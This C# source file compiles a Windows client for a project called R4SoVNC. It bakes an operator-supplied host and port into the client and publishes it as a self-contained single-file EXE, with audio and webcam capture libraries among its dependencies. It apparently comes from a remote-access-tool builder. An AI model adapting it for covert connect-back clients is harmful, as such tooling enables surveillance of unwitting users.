using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;

namespace R4SoVNC.Server.Builder
{
    /// <summary>
    /// Compiles the embedded client source files into a standalone EXE
    /// by generating a temporary .csproj and running "dotnet publish".
    /// HOST and PORT are baked in at compile time via ClientConfig.cs.
    /// </summary>
    public static class ClientCompiler
    {
        private static readonly string SourceDir = Path.Combine(
            Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location)!,
            "ClientSource");

        // NuGet package references the client needs
        private static readonly string[] PackageRefs =
        {
            "<PackageReference Include=\"NAudio\"                   Version=\"2.2.1\" />",
            "<PackageReference Include=\"AForge.Video\"             Version=\"2.2.5\" />",
            "<PackageReference Include=\"AForge.Video.DirectShow\"  Version=\"2.2.5\" />",
            "<PackageReference Include=\"Newtonsoft.Json\"          Version=\"13.0.3\" />",
        };

        public class CompileResult
        {
            public bool   Success      { get; init; }
            public string ExePath      { get; init; } = "";
            public string ErrorMessage { get; init; } = "";
        }

        /// <summary>
        /// Builds the client with the given host/port baked in.
        /// Reports progress via <paramref name="progress"/>.
        /// Returns path to the output .exe on success.
        /// </summary>
        public static CompileResult Compile(string host, int port,
            string outputDir, Action<string> progress,
            CancellationToken cancel = default)
        {
            // ── 1. Locate ClientSource directory ─────────────────────────────
            string srcDir = SourceDir;

            // When running from the project root (e.g. VS debug), look next to the .sln
            if (!Directory.Exists(srcDir))
            {
                // Walk up from executable to find the repo
                string? dir = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
                while (dir != null && !File.Exists(Path.Combine(dir, "r4sovnc.sln")))
                    dir = Path.GetDirectoryName(dir);
                if (dir != null)
                    srcDir = Path.Combine(dir, "R4SoVNC.Server", "ClientSource");
            }

            if (!Directory.Exists(srcDir))
                return Fail("ClientSource directory not found next to the server executable.");

            progress("Preparing build workspace...");

            // ── 2. Create temp directory ──────────────────────────────────────
            string tmpDir = Path.Combine(Path.GetTempPath(), $"r4sovnc_build_{Guid.NewGuid():N}");
            Directory.CreateDirectory(tmpDir);

            try
            {
                // ── 3. Copy all .cs source files ──────────────────────────────
                progress("Copying source files...");
                CopySourceFiles(srcDir, tmpDir);

                // ── 4. Overwrite ClientConfig.cs with baked-in HOST & PORT ────
                string configPath = Path.Combine(tmpDir, "ClientConfig.cs");
                File.WriteAllText(configPath,
                    "namespace R4SoVNC.ClientEmbed\n" +
                    "{\n" +
                    "    internal static class ClientConfig\n" +
                    "    {\n" +
                    $"        public const string HOST = \"{EscapeString(host)}\";\n" +
                    $"        public const int    PORT = {port};\n" +
                    "    }\n" +
                    "}\n",
                    Encoding.UTF8);

                // ── 5. Write the .csproj ──────────────────────────────────────
                progress("Generating project file...");
                string csproj = GenerateCsproj();
                File.WriteAllText(Path.Combine(tmpDir, "R4SoVNC.Client.csproj"), csproj, Encoding.UTF8);

                // ── 6. Run "dotnet publish" ───────────────────────────────────
                progress("Running dotnet publish (this may take a minute)...");
                string publishDir = Path.Combine(tmpDir, "publish");
                string args = $"publish \"{Path.Combine(tmpDir, "R4SoVNC.Client.csproj")}\" " +
                              $"-c Release " +
                              $"-r win-x64 " +
                              $"--self-contained true " +
                              $"-p:PublishSingleFile=true " +
                              $"-p:EnableCompressionInSingleFile=true " +
                              $"-p:IncludeAllContentForSelfExtract=true " +
                              $"-o \"{publishDir}\" " +
                              $"--nologo -v minimal";

                var (exitCode, output) = RunProcess("dotnet", args, cancel);

                if (exitCode != 0)
                    return Fail($"dotnet publish failed (exit {exitCode}):\n{output}");

                // ── 7. Find the built exe ────────────────────────────────────
                string exeSrc = Path.Combine(publishDir, "R4SoVNC.Client.exe");
                if (!File.Exists(exeSrc))
                    return Fail("Publish succeeded but EXE not found.\n" + output);

                // ── 8. Copy to user-chosen output dir ─────────────────────────
                progress("Copying output...");
                Directory.CreateDirectory(outputDir);
                string exeDst = Path.Combine(outputDir, "R4SoVNC.Client.exe");
                File.Copy(exeSrc, exeDst, overwrite: true);

                progress("Done!");
                return new CompileResult { Success = true, ExePath = exeDst };
            }
            catch (OperationCanceledException)
            {
                return Fail("Build cancelled.");
            }
            catch (Exception ex)
            {
                return Fail(ex.ToString());
            }
            finally
            {
                // Clean up temp dir
                try { Directory.Delete(tmpDir, true); } catch { }
            }
        }

        // ── Helpers ───────────────────────────────────────────────────────────

        private static void CopySourceFiles(string srcDir, string dstDir)
        {
            foreach (string file in Directory.GetFiles(srcDir, "*.cs", SearchOption.AllDirectories))
            {
                string rel = Path.GetRelativePath(srcDir, file);
                string dst = Path.Combine(dstDir, rel);
                Directory.CreateDirectory(Path.GetDirectoryName(dst)!);
                File.Copy(file, dst, overwrite: true);
            }
        }

        private static string GenerateCsproj()
        {
            var sb = new StringBuilder();
            sb.AppendLine("<Project Sdk=\"Microsoft.NET.Sdk\">");
            sb.AppendLine("  <PropertyGroup>");
            sb.AppendLine("    <OutputType>Exe</OutputType>");
            sb.AppendLine("    <TargetFramework>net8.0-windows</TargetFramework>");
            sb.AppendLine("    <AssemblyName>R4SoVNC.Client</AssemblyName>");
            sb.AppendLine("    <RootNamespace>R4SoVNC.ClientEmbed</RootNamespace>");
            sb.AppendLine("    <Nullable>enable</Nullable>");
            sb.AppendLine("    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>");
            sb.AppendLine("    <UseWindowsForms>true</UseWindowsForms>");
            sb.AppendLine("    <ImplicitUsings>disable</ImplicitUsings>");
            sb.AppendLine("  </PropertyGroup>");
            sb.AppendLine("  <ItemGroup>");
            foreach (string pkg in PackageRefs)
                sb.AppendLine("    " + pkg);
            sb.AppendLine("  </ItemGroup>");
            sb.AppendLine("</Project>");
            return sb.ToString();
        }

        private static (int exitCode, string output) RunProcess(
            string exe, string args, CancellationToken cancel)
        {
            var psi = new ProcessStartInfo(exe, args)
            {
                UseShellExecute        = false,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                CreateNoWindow         = true,
            };
            using var proc = new Process { StartInfo = psi };
            var outBuf = new StringBuilder();
            proc.OutputDataReceived += (_, e) => { if (e.Data != null) outBuf.AppendLine(e.Data); };
            proc.ErrorDataReceived  += (_, e) => { if (e.Data != null) outBuf.AppendLine(e.Data); };
            proc.Start();
            proc.BeginOutputReadLine();
            proc.BeginErrorReadLine();

            while (!proc.WaitForExit(300))
            {
                if (cancel.IsCancellationRequested)
                {
                    proc.Kill(entireProcessTree: true);
                    throw new OperationCanceledException();
                }
            }
            return (proc.ExitCode, outBuf.ToString());
        }

        private static CompileResult Fail(string msg) =>
            new CompileResult { Success = false, ErrorMessage = msg };

        private static string EscapeString(string s) =>
            s.Replace("\\", "\\\\").Replace("\"", "\\\"");
    }
}
